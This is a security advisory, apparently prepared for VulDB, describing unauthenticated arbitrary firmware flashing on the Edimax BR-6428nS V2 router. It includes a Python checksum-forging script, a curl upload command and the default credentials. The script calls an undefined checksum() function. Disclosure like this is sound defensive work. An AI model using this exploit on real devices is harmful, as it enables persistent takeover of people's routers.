# [CVE-TBD] Unauthenticated Arbitrary Firmware Flash via /goform/formUpload in Edimax BR-6428nS V2

## VulDB Submission Fields

- Vendor: Edimax
- Product: BR-6428nS V2
- Version or Commit: 1.16
- Vulnerability: Improper Verification of Cryptographic Signature (CWE-347)
- Advisory / Exploit URL: replace this with the URL of this directory after copying it to your public repository
- Description:

```
A firmware update vulnerability was discovered in Edimax BR-6428nS V2 firmware v1.16. The /goform/formUpload endpoint of the /bin/webs web server validates an uploaded firmware image using only a 4-byte magic value (cr6g or XZKJ) and a 16-bit word checksum that an attacker can rebalance after modifying any byte; no cryptographic signature is verified, and in the factory-default configuration state no authentication is required. The image is then written directly to the firmware flash partition at offset 0x10000 and the device is rebooted to apply it. Reproduction: uploading a crafted 128 KB image with a rebalanced checksum via a single unauthenticated multipart POST returns HTTP 200 with the vendor upgrade page, and the image bytes are verifiably written to flash (confirmed in an isolated rehosting of the original firmware with syscall tracing of the lseek/write/reboot chain). An adjacent attacker can flash arbitrary persistent firmware, achieving full device control on reboot. Proposed CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (8.8).
```

---

## Technical Disclosure

# CVE-TBD: Unauthenticated Arbitrary Firmware Flash via /goform/formUpload in Edimax BR-6428nS V2

## Summary

A critical firmware-update vulnerability was discovered in the Edimax BR-6428nS
V2 router firmware v1.16. The `/goform/formUpload` HTTP endpoint of the
closed-source web server `/bin/webs` (a Boa 0.94.14rc21 derivative) validates
uploaded firmware images using only a 4-byte magic value and a rebalanceable
16-bit checksum — there is **no cryptographic signature verification** and, in
the factory-default state, **no authentication**. An adjacent (LAN) attacker
can therefore flash an arbitrary firmware image, achieving persistent,
full control of the device on the next reboot.

## Affected Product

- Vendor: **Edimax**
- Product: **BR-6428nS V2** (N300 wireless router, Realtek RTL8196C, MIPS32 BE)
- Firmware: **v1.16** (`BR6428NSv2_v1.16.bin`, SHA-256
 `93bcbbd9ea689ccbd3e69a835617eddba15dd7cba4233769e30dce2aae69b6c1`)
- v1.16 is the latest and final release on the vendor download page
 (verified 2026-10). The product line is end-of-life.

## Vulnerability Details

- Type: Improper Verification of Cryptographic Signature (**CWE-347**);
 Missing Authentication for Critical Function (**CWE-306**)
- Component: `/bin/webs`, handler `formUpload` (function @ `0x00439060`)

### Root cause

The upgrade handler accepts a multipart upload (field name `binary`) and
performs exactly two checks on the image before writing it to flash:

1. **Magic comparison** — `memcmp(data, "cr6g", 4) == 0` or
 `memcmp(data, "XZKJ", 4) == 0` (offset `V-0x2b8` / `V-0x2b0` in the string
 pool; both constants resolved from the binary).
2. **16-bit word checksum** — the sum of big-endian u16 words from image
 offset `0x10` to the end must equal `0`.

Neither check binds the image to the vendor: the checksum can be trivially
rebalanced (modify any byte, then adjust one compensation word — verified
experimentally, see PoC). No RSA/HMAC/signature of any kind is consulted.

On success the handler (strace-verified execution chain):

```
open("/dev/mtdblock0", O_RDWR)
lseek(fd, 0x10000, SEEK_SET) # firmware partition offset
execve("/bin/sh", ["sh","-c","killapp.sh"]) # stop applications
write(fd, <entire attacker image>, len) # arbitrary bytes to flash
execve("/bin/sh", ["sh","-c","/bin/reboot.sh 30 &"]) # flash on reboot
```

### Authentication context

* Factory-default state: no authentication required (setup-wizard mode).
* Configured state: HTTP Basic auth applies, but the 401 challenge realm
 discloses the default credentials (`Default Name:admin Password:1234`).

## Proof of Concept (non-destructive)

Performed in an isolated rehosted environment (QEMU user-mode + chroot of the
original firmware). On production hardware, re-flashing the stock image is a
normal maintenance operation and restores the original state.

**Step 1 — build a minimal, checksum-balanced test image** (no malicious
payload; verifies that "validation" is forgeable):

```python
# fw_mini.py
import struct
img = bytearray(b"cr6g" + b"\x00"*12 + b"\xAA"*0x20000) # magic + pad
s = 0
for i in range(0x10, len(img)-1, 2):
 s = (s + struct.unpack(">H", img[i:i+2])[0]) & 0xFFFF
img[0x12:0x14] = struct.pack(">H",
 (struct.unpack(">H", img[0x12:0x14])[0] - s) & 0xFFFF) # rebalance
assert checksum(img) == 0
open("fw_mini.bin","wb").write(img)
```

**Step 2 — upload without any credentials** (factory-default state):

```bash
curl -X POST http://<device>/goform/formUpload \
 -F "submit-url=/index.asp" -F "binary=@fw_mini.bin"
# -> HTTP 200, upgrade progress page ("Rebooting....." flow scheduled)
```

**Observed results (rehosted firmware, 2026-10-22):**
- HTTP 200 with the vendor upgrade progress page.
- The flash device file grew from 65536 to 196678 bytes; the bytes at flash
 offset `0x10000` exactly equal the crafted image (`cr6g…`).
- strace of the daemon confirmed the `lseek(0x10000) → write(131142 bytes) →
 reboot.sh 30` chain quoted above.
- A byte-modified copy of the *stock* firmware (deep byte flipped, checksum
 rebalanced) also passes validation (checksum self-test = 0), demonstrating
 that modified vendor images are accepted just as well.

Control: the same upload with a non-`cr6g`/`XZKJ` file is rejected, showing
the magic check is the only format gate.

## Impact

An adjacent network attacker (LAN; or WAN if remote management is enabled)
can, without credentials on a factory-default device:

- replace the firmware with an arbitrary image → persistent root-level code
 execution at every boot (survives factory-reset of settings);
- subsume all other configuration-level compromises on the device.

On configured devices the default credentials are disclosed in the 401 realm,
so the practical bar is the same unless the operator changed the password.
This is the strongest primitive found on this firmware; it chains with and
supersedes the unauthenticated configuration-restore issue (advisory #2).

## CVSS 3.1

`AV:A/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` — **8.8 (High)**
(Adjacent-network, no privileges or user interaction in the factory state;
full confidentiality/integrity/availability of the device via persistent code.)

## Discovery

Vendor notified: pending.
